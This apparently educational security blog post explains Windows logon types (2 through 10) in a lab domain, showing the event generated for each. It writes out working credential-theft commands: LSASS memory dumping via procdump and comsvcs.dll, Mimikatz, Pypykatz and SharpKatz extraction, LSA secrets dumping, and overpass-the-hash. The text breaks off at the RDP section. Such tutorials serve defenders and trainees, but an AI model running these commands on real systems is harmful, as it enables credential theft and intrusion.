> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.alteredsecurity.com](https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them)

> Hello All, In this blog post we will explore and learn about various Windows Logon Types and understa......

Hello All,

In this blog post we will explore and learn about various Windows Logon Types and understand how are these logon type events are generated. We will also see if we can extract credentials from individual logon types. We will be using our [Active Directory Attack Defense Lab](https://www.pentesteracademy.com/activedirectorylab) for all the demos.

### **Table of Contents:**

- [What is logon ?](https://www.alteredsecurity.com/#viewer-5t3rc)

- [What is LSA ?](https://www.alteredsecurity.com/#viewer-92hk0)

- [Enable Logon Events](https://www.alteredsecurity.com/#viewer-9nt1q)

- [What is LSASS ?](https://www.alteredsecurity.com/#viewer-d8oei)

- [Dump LSASS process memory](https://www.alteredsecurity.com/#viewer-f74bo)

- [Extract Credentials Offline (On the attacker machine instead of the target machine)](https://www.alteredsecurity.com/#viewer-fnctm)

- [How many types of logon are there? / Overview of Windows Logon Types](https://www.alteredsecurity.com/#viewer-5c8ot)

- [Logon Type 2 : Interactive](https://www.alteredsecurity.com/#viewer-apkts)

- [Logon Type 3 : Network](https://www.alteredsecurity.com/#viewer-392c9)

- [Logon Type 4 : Batch](https://www.alteredsecurity.com/#viewer-di6c0)

- [Logon Type 5 : Service](https://www.alteredsecurity.com/#viewer-52u7o)

- [Logon Type 7 : Unlock](https://www.alteredsecurity.com/#viewer-5movr)

- [Logon Type 8 : NetworkClearText](https://www.alteredsecurity.com/#viewer-agegc)

- [Logon Type 9 : NewCredentials](https://www.alteredsecurity.com/#viewer-733hk)

- [Logon Type 10 : RemoteInteractive](https://www.alteredsecurity.com/#viewer-85rtb)

- [Logon Type 11 : CachedInteractive](https://www.alteredsecurity.com/#viewer-6ojsf)

- [Logon Type 12 : CachedRemoteInteractive](https://www.alteredsecurity.com/#viewer-1n89o)

- [Logon Type 13 : CachedUnlocked](https://www.alteredsecurity.com/#viewer-1c7p4)

- [References](https://www.alteredsecurity.com/#viewer-g2hg)

### **What is logon ?**

In simple words logon is a process of gaining access to local or remote systems using valid credentials. The user information is validated by Local Security Authority (LSA), incase of local account it will verify the information from Security Accounts Manager (SAM) database and incase of domain account it will verify the information from the Domain Controller.

We can read this [thread](https://twitter.com/SteveSyfuhs/status/1297957799079510018) from [Steve Syfuhs](https://twitter.com/SteveSyfuhs) to understand more about how the logon process works in background.

### **What is LSA ?**

As per [Microsoft docs](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication#BKMK_LSA) "The Local Security Authority (LSA) is a protected system process that authenticates and logs users on to the local computer. In addition, LSA maintains information about all aspects of local security on a computer (these aspects are collectively known as the local security policy), and it provides various services for translation between names and security identifiers (SIDs)."

Now, let's see how we can enable the logon events and view the logon events in Windows.

### **Enable Logon Events**

To capture the logon events we need to enable the "Audit Logon" setting from the Group Policy. Follow the below steps to enable the logs via Group Policy.

**Domain Environment**

1) Login to Domain Controller

2) Open Group Policy Management Console

3) Expand the Domain Object

4) Expand the Group Policy Objects

5) Right click on the Default Domain Policy and click on Edit (The policy that is applied to all the domain computers. It may differ in your environment)

6) Follow the below path to enable Audit Logon events.

Computer Configuration --> Windows Settings --> Security Settings --> Advanced Audit Policy Configuration --> Audit Policies --> Logon/Logoff --> Audit Logon

7) Select "Configure the following audit events:", "Success" & "Failure" Checkbox

**Local Machine**

1) Open Local Group Policy Editor

2) Follow the below path to enable Audit Logon events.

Computer Configuration --> Windows Settings --> Security Settings --> Advanced Audit Policy Configuration --> System Audit Policies - Local Group Policy Object --> Logon/Logoff --> Audit Logon

3) Select "Configure the following audit events:", "Success" & "Failure" Checkbox

In Windows we can use Event Viewer for viewing the events that are generated by various applications/processes etc. The logon events are considered as security event hence those are stored in "%SystemRoot%\System32\Winevt\Logs\Security.evtx" file. To view the events we can follow the below mentioned steps:

1) Right click on the Start button

2) Click on the Event Viewer

3) Expand the Windows Logs section

4) Click on Security

We can view all the Security Events on the right side. We can also filter the events using "Filter current log..." button from the Actions section.

![](https://static.wixstatic.com/media/8b80b6_72752350059349dc8d393588cbbdca2d~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Event Viewer

Before jumping on the Windows Logon Types section, let's first discuss about various ways to dump the LSASS process memory. We can use this for extracting the credentials offline.

Note: If you are aware of the process of dumping LSASS process memory then you can script this section.

### **What is LSASS ?**

As per [Microsoft docs](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication) "The Local Security Authority Subsystem Service (LSASS) stores credentials in memory on behalf of users with active Windows sessions. The stored credentials let users seamlessly access network resources, such as file shares, Exchange Server mailboxes, and SharePoint sites, without re-entering their credentials for each remote service."

### **Dump LSASS process memory**

There are multiple methods available to dump the LSASS process memory. We will cover few well known techniques as listed below. There are plenty of other methods that can be used to dump LSASS memory.

Note: We need administrator privileges to dump the LSASS process memory.

1) Using Task Manager

2) Using Procdump

3) Using COMSVCS.dll

4) Using WindowsAPIs / Syscalls

**Using Task Manager**

This is most simplest method to dump the LSASS process memory if we have GUI access on the machine. We can follow the below mentioned steps:

1) Right click on the Task Bar and click on Task Manager

2) 3) Click on More details

4) Search for "Local Security Authority Process" process in the Processes tab

5) Right click on "Local Security Authority Process" process and click on "Create dump file".

![](https://static.wixstatic.com/media/8b80b6_9775e02851154f9abf6d26d6e390d760~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

LSASS Memory Dump using Task Manager

The dump file is stored in the temp folder on the machine. In our case the file is stored at "C:\Users\STUDEN~1\AppData\Local\Temp" location.

**Using Procdump**

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is a Microsoft signed binary which is a part of [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite. It is a command line utility used for monitoring CPU spikes for applications and for dumping running process memory.

We can download the [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) file from Microsoft site . The file will be downloaded in the ZIP format. We can extract the file and follow the below mentioned steps to dump the LSASS process memory:

1) Start PowerShell / CMD with Administrators privileges.

2) Go to the [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) directory.

3) Find the process id of the LSASS process.

4) Execute [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)

We can use the Process Name or Process ID while dumping the LSASS process memory using [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump). [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) internally leverages [MiniDumpWriteDump](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump) Windows API to dump the process memory.

```
.\procdump.exe -ma lsass.exe lsass.dmp

```

![](https://static.wixstatic.com/media/8b80b6_63095f742b6c4e7486f16d3797e0ce1a~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

LSASS Memory Dump using Procdump

```
Get-Process -Name LSASS

.\procdump.exe -ma 608 lsass.dmp

```

![](https://static.wixstatic.com/media/8b80b6_f2b7c6e0da2245cd8f28e45527b58b68~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

LSASS Memory Dump using Procdump

**Using COMSVCS.dll**

Dynamic Link Library (DLL) is a file which contains the code and it can be loaded by the program to perform one or more actions during the run time. COMSVCS.dll is a Microsoft signed DLL that is present on the windows system. It contains an exported function MiniDumpW that internally leverages [MiniDumpWriteDump](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump) Windows API. To successfully dump the LSASS process memory we need to pass 3 arguments

1) Process ID - Specify LSASS process id.

2) File path - Specify the path where we want to save the dump file.

3) [DumpType](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ne-minidumpapiset-minidump_type) - Specify the dump type in our case we will use full

We can follow the below mentioned step to dump the LSASS process memory using COMSVCS.dll:

1) Start PowerShell / CMD with Administrators privileges.

2) Find the process id of the LSASS process.

3) Use rundll32 to execute COMSVCS.dll file

```
Get-Process -Name LSASS

rundll32.exe comsvcs.dll, MiniDump 608 C:\Users\student66\Desktop\lsass.dmp full

```

![](https://static.wixstatic.com/media/8b80b6_153581ca51f74b6e902c7898aab7cf9c~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

LSASS Memory Dump using COMSVCS.dll

Note: We can find more details about this technique on [Modexp blog](https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/).

**Using WindowsAPIs / Syscalls**

We can create our custom tool/script that will leverage WindowsAPIs or Syscalls for dumping the process memory. There are multiple such tools that are already present online such as mentioned below. This will be an exercise for the readers to use different tools for dumping the LSASS process memory using custom tool.

1) [Minidump](https://github.com/3xpl01tc0d3r/Minidump)

2) [SharpDump](https://github.com/GhostPack/SharpDump)

3) [SharpMiniDump](https://github.com/b4rtik/SharpMiniDump)

4) [ATPMiniDump](https://github.com/b4rtik/ATPMiniDump)

5) [Dumpert](https://github.com/outflanknl/Dumpert)

6) [Out-Minidump.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1)

### **Extract Credentials Offline (On the attacker machine instead of the target machine)**

We can use tools such as [Mimikatz](https://github.com/gentilkiwi/mimikatz) and [Pypykatz](https://github.com/skelsec/pypykatz) to parse the dump file offline (On the attacker machine instead of the target machine) and extract the credentials.

**Using Mimikatz**

We can use the below mentioned [Mimikatz](https://github.com/gentilkiwi/mimikatz) commands to parse the minidump file and extract the credentials.

```
privilege::debug
sekurlsa::minidump C:\Users\student66\Desktop\lsass.dmp
sekurlsa::ekeys

```

![](https://static.wixstatic.com/media/8b80b6_2d8ecb51a4b646d889cad247a0c06f13~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Mimikatz

**Using Pypykatz**

We can use the below mentioned [Pypykatz](https://github.com/skelsec/pypykatz) commands to parse the minidump file and extract the credentials.

```
pypykatz.exe lsa minidump C:\Users\student66\Desktop\lsass.dmp

```

![](https://static.wixstatic.com/media/8b80b6_098012129bbb42f4bc186127a1041be3~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Pypykatz

### **How many types of logon are there? / Overview of Windows Logon Types**

Now, let's learn about various Windows Logon Types and understand how are these logon type events are generated. We will also see if we can extract credentials from individual logon types.

We can also get additional information from [Ultimate Windows Security Blog](https://www.ultimatewindowssecurity.com/securitylog/book/page.aspx?spid=chapter3) and [Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types).

### **Logon Type 2 : Interactive**

Logon Type 2 event is generated when a user logon at the console of a machine.

![](https://static.wixstatic.com/media/8b80b6_ec6926e096b54e98aaff1b2d76546fd6~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Interactive Logon

Once we logon to the machine using Console, we can see in the below screenshot that the Logon Type 2 event gets generated.

![](https://static.wixstatic.com/media/8b80b6_fa827c3b5bb04fa1bda4c92dc9e1a00f~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Interactive Logon Event

Now, let’s see if we can extract the credentials from the memory.

In this post we will leverage 3 tools for credentials extraction.

1) [Mimikatz](https://github.com/gentilkiwi/mimikatz) - It is a tool written in C. It is one of the most common tools used for extracting credentials from the Windows system. (Note: We can also use [Mimikatz PowerShell script](https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1).)

2) [Pypykatz](https://github.com/skelsec/pypykatz) - It is a tool written in python that can also help us in extracting credentials from the system.

3) [Sharpkatz](https://github.com/b4rtik/SharpKatz) - It is a tool written in C# for extracting credentials from the Windows system. (Note: We need to build the source code using visual studio or any other utility that can be used to build C# project.)

**Using Mimikatz**

We can use the below mentioned [Mimikatz](https://github.com/gentilkiwi/mimikatz) commands for extracting the credentials.

```
privilege::debug
sekurlsa::ekeys

```

![](https://static.wixstatic.com/media/8b80b6_abdbf9a4d5144bc38706e90d2984db85~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Mimikatz

**Using Pypykatz**

We can use the below mentioned [Pypykatz](https://github.com/skelsec/pypykatz) commands for extracting the credentials.

```
pypykatz.exe live lsa

```

![](https://static.wixstatic.com/media/8b80b6_715831ca1696456093da7a3f27498112~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Pypykatz

**Using Sharpkatz**

We can use the below mentioned [Sharpkatz](https://github.com/b4rtik/SharpKatz) commands for extracting the credentials.

```
SharpKatz.exe --Command ekeys

```

![](https://static.wixstatic.com/media/8b80b6_c3849c662f0b4819a1b24c88bd8ff232~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Sharpkatz

### **Logon Type 3 : Network**

Logon Type 3 event is generated when a user logon at the machine over the network. Commonly for accessing shared resources. For example when we access a shared folder, connects to the machine via WinRM (Windows Remote Management protocol), PSRemoting (PowerShell Remoting) or using WMI (Windows Management Instrumentation) etc.

**Accessing Shared Files/Folders**

As per [Microsoft docs](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) "The Server Message Block (SMB) Protocol is a network file sharing protocol, and as implemented in Microsoft Windows is known as Microsoft SMB Protocol. The set of message packets that defines a particular version of the protocol is called a dialect. The Common Internet File System (CIFS) Protocol is a dialect of SMB. Both SMB and CIFS are also available on VMS, several versions of Unix, and other operating systems."

So when we connect to the SMB share it will generate Logon Type 3 event. We can see the same in the below screenshot wherein we are leveraging smbclient utility to list all the shared files/folders that are accessible to the student66 user on the remote machine.

```
smbclient -L 172.16.100.66 -U 'student66' -W dcorp

```

![](https://static.wixstatic.com/media/8b80b6_2630f3e6104446bc8d131d05e27b3248~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Access Shared Folder using SMBClient

Once we access the shared folder using SMBClient, we can see in the below screenshot that the Logon Type 3 event gets generated.

![](https://static.wixstatic.com/media/8b80b6_1a8b86584c0d438abc794ab7b2081b61~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

SMBClient Network Logon Event

**Accessing the Machine using WinRM**

As per [Microsoft docs](https://docs.microsoft.com/en-us/windows/win32/winrm/about-windows-remote-management) "Windows Remote Management is one component of the Windows Hardware Management features that manage server hardware locally and remotely. These features include a service that implements the WS-Management protocol, hardware diagnosis and control through baseboard management controllers (BMCs), and a COM API and scripting objects that allow you to write applications that communicate remotely through the WS-Management protocol."

To access the machine using WinRM we will leverage crackmapexec & Evil-WinRM tool.

Crackmapexec tool is written in python3 for post exploitation. We can download Crackmapexec tool from the [GitHub repo](https://github.com/byt3bl33d3r/CrackMapExec)

```
crackmapexec winrm 172.16.100.66 -u student66 -p Esxxxxxxx -d dollarcorp.moneycorp.local -x whoami

```

![](https://static.wixstatic.com/media/8b80b6_dd8a76501d224123974006923150a109~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Command Execution using Crackmapexec over WinRM

The above command will execute the whoami command by leveraging the Crackmapexec tool on the remote machine using Student66 user credentials. It will also generate the Logon Type 3 event. We can see the same in the below screenshot.

![](https://static.wixstatic.com/media/8b80b6_595990e2acca4923b9fec32413630853~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

WinRM Network Logon Event

Evil-WinRM tool is written in ruby for post exploitation. We can download the Evil-WinRM tool from [GitHub repo](https://github.com/Hackplayers/evil-winrm).

```
evil-winrm -i 172.16.100.66 -u 'dcorp\student66' -p 'Esxxxxxxxx' 

```

![](https://static.wixstatic.com/media/8b80b6_fbd56f85bb4645fe9d42b8afe874d816~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Command Execution using Evil-WinRM over WinRM

We can see in the above screenshot that we have successfully gained access to the remote machine using Student66 user. It will also generate the Logon Type 3 event. We can see the same in the below screenshot.

![](https://static.wixstatic.com/media/8b80b6_daea3a695df745768d695d86099aea25~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

WinRM Network Logon Event

**Accessing the Machine using WMI**

As per [Microsoft docs](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) "Windows Management Instrumentation (WMI) is the Microsoft implementation of Web-Based Enterprise Management (WBEM), which is an industry initiative to develop a standard technology for accessing management information in an enterprise environment. WMI uses the Common Information Model (CIM) industry standard to represent systems, applications, networks, devices, and other managed components. CIM is developed and maintained by the [Distributed Management Task Force](https://www.dmtf.org/standards/cim)."

So let's use WMI to list the process of the remote machine.

```
$password = ConvertTo-SecureString "Esxxxxxxxxx" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ("dcorp\student66", $password)
Get-WmiObject -Class Win32_Process -Credential $Cred -ComputerName 172.16.100.66

```

![](https://static.wixstatic.com/media/8b80b6_497c07e452ed4415ba5b4a879cefcb8b~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Command Execution using WMI

We can see in the above screenshot that we have successfully listed the running process of the remote machine using the Student66 user's credential. It will also generate the Logon Type 3 event. We can see the same in the below screenshot.

![](https://static.wixstatic.com/media/8b80b6_7e6f64b7774d42b0a5534f16fac73d0c~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

WMI Network Logon Event

**Accessing the Machine using PSRemoting**

As per [Microsoft docs](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.1#windows-powershell-remoting) "Using the WS-Management protocol, Windows PowerShell remoting lets you run any Windows PowerShell command on one or more remote computers. You can establish persistent connections, start interactive sessions, and run scripts on remote computers."

We will use PSRemoting to gain access to the remote machine and execute a command.

```
$password = ConvertTo-SecureString "Esxxxxxxx" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ("dcorp\student66", $password)
Enter-PSSession -ComputerName 172.16.100.66 -Credential $Cred

```

![](https://static.wixstatic.com/media/8b80b6_9d9848ea7eab441d8a1ca5875174d628~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Command Execution using PSRemoting

We can see in the above screenshot that we have successfully gained access to the remote machine using Student66 user. It will also generate the Logon Type 3 log. We can see the same in the below screenshot.

![](https://static.wixstatic.com/media/8b80b6_818126c6a15e44f981f5c9b4f393314f~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

PSRemoting Network Logon Event

We couldn't extract the credentials for Logon Type 3 while trying with [Mimikatz](https://github.com/gentilkiwi/mimikatz), [Pypykatz](https://github.com/skelsec/pypykatz), and [Sharpkatz](https://github.com/b4rtik/SharpKatz).

### **Logon Type 4 : Batch**

Logon Type 4 event is generated when a schedule task is executed with a specific user. For example a user "lowpriv" schedules a backup and runs that backup as an "admin" user. For scheduling a task we will use the built-in Windows Task Scheduler.

Steps for creating a scheduled task in Windows.

1) Open Task Scheduler

2) Right click on the “Task Scheduler Library” and click on Create Task option.

3) Follow the menu and create a scheduled task to run "cmd.exe" for demo.

![](https://static.wixstatic.com/media/8b80b6_9707c1ed4aba4aaab7dddd1826810f50~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Create Schedule Task

Once we create the task right-click on it and click on properties. Select the “Run whether the user is logged on or not'' option and provide the user credentials. In our case, we are using an Administrator user. (The same can be done while creating the scheduled task.

As soon as the task is created it will generate a Logon Type 4 event. We can see the same in the below screenshot.

![](https://static.wixstatic.com/media/8b80b6_a104c1d11a7a4a0196fbfb41d249c5e6~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Batch Logon Event

Now, let’s see if we can extract the credentials from the memory.

We will use [Mimikatz](https://github.com/gentilkiwi/mimikatz), Pypykatz and [Sharpkatz](https://github.com/b4rtik/SharpKatz).

**Using Mimikatz**

We can use the below mentioned [Mimikatz](https://github.com/gentilkiwi/mimikatz) commands for extracting the credentials.

```
privilege::debug
sekurlsa::ekeys

```

![](https://static.wixstatic.com/media/8b80b6_be0387b2a60e4845a4d12672f0a38d93~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Mimikatz

We can also extract cleartext credentials from Task Scheduler by reading the credentials from the Vault using [Mimikatz](https://github.com/gentilkiwi/mimikatz). We need SYSTEM privileges to extract the cleartext credentials.

```
privilege::debug
token::elevate
vault::cred /patch

```

![](https://static.wixstatic.com/media/8b80b6_a8eb46c49f7744d699aeed273113ebaf~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Mimikatz

**Using Pypykatz**

We can use the below mentioned [Pypykatz](https://github.com/skelsec/pypykatz) commands for extracting the credentials.

```
pypykatz.exe live lsa

```

![](https://static.wixstatic.com/media/8b80b6_75d6aa47a05d4fedb55b2e1899f45fb6~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Pypykatz

**Using Sharpkatz**

We can use the below mentioned [Sharpkatz](https://github.com/b4rtik/SharpKatz) commands for extracting the credentials.

```
SharpKatz.exe --Command ekeys

```

![](https://static.wixstatic.com/media/8b80b6_531d731aaa6148b4957c77078fccb9c5~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Sharpkatz

### **Logon Type 5 : Service**

Logon Type 5 event is generated when a service is started with a specific user. We can configure a service to run as a specific user wherein windows will create a new logon session for the service. The new logon session is not created if it is executed with "Local System", "NT AUTHORITY|LocalService" or "NT AUTHORITY\NetworkService" users.

We can follow the below mentioned steps to configure a service to run as a specific user:

1) Open Services.msc.

2) Select a service that we want to modify.

3) Right click and click on properties.

4) Go to the "Log On" tab.

5) Select “This account” radio button and click on "Browse..." button and add an account by which the service will run.

6) Enter the password in "Password" & "Confirm Password" field.

7) Click on "Apply" and the "OK".

8) Restart the service.

For our demo we will modify "SNMP Trap" service as seen in the below screenshot.

![](https://static.wixstatic.com/media/8b80b6_1c4828c5f84a4d7b85b7e4b0a5114b56~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Modify Service Configuration

Once we restart the service Logon Type 5 event is generated. We can see the same in the below screenshot.

![](https://static.wixstatic.com/media/8b80b6_e4e3a489050043b283cc37b6baa2bd14~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Service Logon Event

**Using Mimikatz**

We can use the below mentioned [Mimikatz](https://github.com/gentilkiwi/mimikatz) commands for extracting the credentials.

```
privilege::debug
sekurlsa::ekeys

```

![](https://static.wixstatic.com/media/8b80b6_5d77ad0fcf3b42c995be11cb28748162~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Mimikatz

We can also extract cleartext credentials from services by dumping LSA Secrets using [Mimikatz](https://github.com/gentilkiwi/mimikatz). LSA Secrets stores secrets like service account passwords, SYSTEM account password and other important secrets. We can only extract this secrets by SYSTEM privileges so first we will elevate our privileges and then extract the credentials .

```
privilege::debug
token::elevate
lsadump::secrets

```

![](https://static.wixstatic.com/media/8b80b6_c0e757429f974dc6a8d100bb4df43171~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Mimikatz

**Using Pypykatz**

We can use the below mentioned [Pypykatz](https://github.com/skelsec/pypykatz) commands for extracting the credentials.

```
pypykatz.exe live lsa

```

![](https://static.wixstatic.com/media/8b80b6_edf6a6c6fb4a46d7a56797f104277107~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Pypykatz

**Using Sharpkatz**

We can use the below mentioned [Sharpkatz](https://github.com/b4rtik/SharpKatz) commands for extracting the credentials.

```
SharpKatz.exe --Command ekeys

```

![](https://static.wixstatic.com/media/8b80b6_4ed5e1873a744234998512d408262cfe~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Sharpkatz

### **Logon Type 7 : Unlock**

Logon Type 7 event is generated when a user tries to unlock a locked machine. For example, let's assume that we need to go somewhere for few minutes so as a best practice we shall always lock our machine. Once we return we will unlock our machine and start using it again. This will generate a Logon Type 7 event as we can see the same in the below screenshot.

![](https://static.wixstatic.com/media/8b80b6_9be45328dede48f483917e832513225f~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Unlock Event

### **Logon Type 8 : NetworkClearText**

Logon Type 8 event is generated when user credentials are passed in cleartext to the authentication package. There are multiple use cases where we can see the Logon Type 8 event is generated like while using IIS (Internet Information Services) Basic Authentication, using SSH (Secure Shell Protocol), or by using FTP (File Transfer Protocol) for authentication.

For demonstration purposes, we will use SSH & FTP services.

SSH is known as Secure Shell or Secure Socket Shell. It is a network protocol that helps users to gain access to the remote machine.

We can see in the below screenshot that we have used Student66 user to authenticate to the remote machine.

![](https://static.wixstatic.com/media/8b80b6_70bd2b6c36674af79e277be23aa0d585~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

SSH

Once we gain access to the remote machine using SSH, we can see in the below screenshot that Logon Type 8 event gets generated

![](https://static.wixstatic.com/media/8b80b6_426a7ca1af354acc86a33d72f7954522~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

SSH NetworkClearText Logon Event

FTP is a file transfer protocol that is used for transferring files. We will use Student66 user to authenticate to the remote FTP service.

![](https://static.wixstatic.com/media/8b80b6_8adc49c9238c49ed87f15ba7f256cf7d~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

FTP

Once we authenticate to the FTP service, we can see in the below screenshot that the Logon Type 8 event gets generated.

![](https://static.wixstatic.com/media/8b80b6_1f01398324144fc585eaf0706c1ce9ee~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

FTP NetworkClearText Logon Event

**Using Mimikatz**

We can use the below mentioned [Mimikatz](https://github.com/gentilkiwi/mimikatz) commands for extracting the credentials.

```
privilege::debug
sekurlsa::ekeys

```

![](https://static.wixstatic.com/media/8b80b6_5683e928f88f4f9694a64c86afc52b1c~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Mimikatz

**Using Pypykatz**

We can use the below mentioned [Pypykatz](https://github.com/skelsec/pypykatz) commands for extracting the credentials.

```
pypykatz.exe live lsa

```

![](https://static.wixstatic.com/media/8b80b6_0733e8a762a34b52a498c0f420e5cbe3~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Pypykatz

**Using Sharpkatz**

We can use the below mentioned [Sharpkatz](https://github.com/b4rtik/SharpKatz) commands for extracting the credentials.

```
SharpKatz.exe --Command ekeys

```

![](https://static.wixstatic.com/media/8b80b6_4afa7343af1f4773bd72683093ca7172~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Sharpkatz

### **Logon Type 9 : NewCredentials**

Logon Type 9 event is generated when a user leverages RunAs command with /netonly option to start a program. It will create a new logon session with the same local identity but with different credentials. This is ideally used for access network resources with a different user.

For our demonstration, we will use administrator user with the RunAs command and start a new CMD process.

```
runas /netonly /user:dcorp\administrator cmd

```

![](https://static.wixstatic.com/media/8b80b6_578ca64966f048e5a5591832abab90a1~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Command Execution using RunAs

In the above screenshot, we can see that without using RunAs we are not able to access the shared folder on the DC, but after starting the new CMD console by leveraging the RunAs command we can access the same as it is leveraging the administrator user privileges. But in the new CMD console, the output for the whoami command is still shown as "Student66".

![](https://static.wixstatic.com/media/8b80b6_69fd5bd999a94234b2bae6958918e890~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

NewCredentials Logon Event

**Using Mimikatz**

We can use the below mentioned [Mimikatz](https://github.com/gentilkiwi/mimikatz) commands for extracting the credentials.

```
privilege::debug
sekurlsa::ekeys

```

![](https://static.wixstatic.com/media/8b80b6_dab8e48652894e668ce72cbdbe47013d~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Mimikatz

**Using Pypykatz**

We can use the below mentioned [Pypykatz](https://github.com/skelsec/pypykatz) commands for extracting the credentials.

```
pypykatz.exe live lsa

```

![](https://static.wixstatic.com/media/8b80b6_3438bf3944c546c1abf673fff3e34b5d~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Pypykatz

**Using Sharpkatz**

We can use the below mentioned [Sharpkatz](https://github.com/b4rtik/SharpKatz) commands for extracting the credentials.

```
SharpKatz.exe --Command ekeys

```

![](https://static.wixstatic.com/media/8b80b6_48367ce69ed240688fdc0c879aeacb5e~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

Extract Credentials using Sharpkatz

**OverPass-the-Hash attack**

Logon Type 9 event is also generated when we perform the OverPass-the-Hash attack. In this attack, we can use the NT hash to request the Kerberos TGT for a different user

For demonstration purposes, we will use [Mimikatz](https://github.com/gentilkiwi/mimikatz) to perform the OverPass-the-Hash attack and spawn the CMD process.

Note: We can also leverage the AES keys for performing OverPass-the-Hash attack.

```
privilege::debug

sekurlsa::pth /user:administrator /domain:dcorp /ntlm:afxxxxx /run:cmd.exe

```

![](https://static.wixstatic.com/media/8b80b6_dd317302c1de4e34aab12a2e5103fe6c~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

OverPass-the-Hash Attack

Once we perform the OverPass-the-Hash attack, we can see in the below screenshot that it has generated a Logon Type 9 event.

![](https://static.wixstatic.com/media/8b80b6_ef9533fe2c674ee582806a5b3622b445~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png)

NewCredentials Logon Event

### **Logon Type 10 : RemoteInteractive**

As per Microsoft docs "The Microsoft Remote Desktop Protocol (RDP) provides remote display and input capabilities over network connections for Windows-based applications running on a server. RDP is designed to support different types of network topologies and multiple LAN protocols."

We will use Windows built-in utility Remote Desktop Connection (mstsc) & xfreerdp from Linux to connect our remote machine for demo.

Additionally, we will also use a tool known as SharpRDP. It is a console application written in C# for connecting to the remote machine using RDP.

Let's first connect with Remote Desktop Connection (mstsc) utility to the remote machine.

